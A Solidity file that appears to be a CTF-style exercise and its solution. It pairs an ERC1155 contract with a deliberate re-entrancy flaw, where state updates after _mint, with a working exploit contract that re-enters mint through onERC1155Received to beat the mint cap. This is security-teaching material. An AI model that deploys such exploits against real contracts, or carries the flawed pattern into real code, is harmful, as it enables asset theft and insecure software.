// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155 is ERC1155 {
    using Address for address;
    mapping(address => mapping(uint256 => uint256)) public amountMinted;
    mapping(uint256 => uint256) public totalSupply;

    constructor() ERC1155("Overmint1_ERC1155") {}

    function mint(uint256 id, bytes calldata data) external {
        require(amountMinted[msg.sender][id] <= 3, "max 3 NFTs");
        totalSupply[id]++;
        _mint(msg.sender, id, 1, data);
        amountMinted[msg.sender][id]++;
    }

    function success(address _attacker, uint256 id) external view returns (bool) {
        return balanceOf(_attacker, id) == 5;
    }
}

// Write your exploit codes below
contract ExploitContract {

    /**
     * @dev the attack is possible due to state change after `_mint` function is called
     * which creates re-entrancy attack via `onERC1155Received` callback
     */
    function exploit(address overmint) public {
        Overmint1_ERC1155(overmint).mint(0, "");
    }

    function onERC1155Received( address, address, uint256 id, uint256, bytes calldata) public  returns (bytes4) {
        if (ERC1155(msg.sender).balanceOf(address(this), id) < 5) {
            Overmint1_ERC1155(msg.sender).mint(id, "");
        }
        return IERC1155Receiver.onERC1155Received.selector;
    }
}